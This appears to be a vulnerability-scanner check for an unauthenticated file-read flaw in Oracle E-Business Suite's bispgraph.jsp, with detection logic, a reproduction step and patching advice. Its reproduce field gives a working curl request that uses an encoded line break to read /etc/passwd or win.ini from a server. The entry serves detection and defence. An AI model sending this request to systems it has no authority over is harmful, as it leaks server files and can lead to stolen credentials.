title: Oracle E-Business Suite bispgraph.jsp reads arbitrary files
summary: The bispgraph.jsp endpoint takes a file name and folder and returns the file, so an unauthenticated visitor can read files off the server such as /etc/passwd. The request uses an encoded line break and a .js suffix to get past the extension check. A file read like this leaks configuration and can lead to credentials.

confirm.control: A path that cannot exist, so the site's not found answer is known and a real file read is told apart from a soft 404.
confirm.differential: status == 200 and ((body_contains("root:") and body_contains("bin/bash")) or body_contains("[extensions]") or body_contains("[fonts]")) and body_differs(control)

reproduce: curl -sk 'https://host/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/' and check the body returns the contents of /etc/passwd (lines with 'root:' and 'bin/bash'). On Windows try ifn=win.ini&ifl=c:/windows/ and look for '[extensions]' or '[fonts]'. A 200 with the file contents proves the read.
remediate: Patch Oracle E-Business Suite to a release that fixes the bispgraph.jsp traversal, and block /OA_HTML/bispgraph.jsp with the Oracle E-Business Suite Allowed Resources (URL Firewall) framework so it is not reachable without authentication.
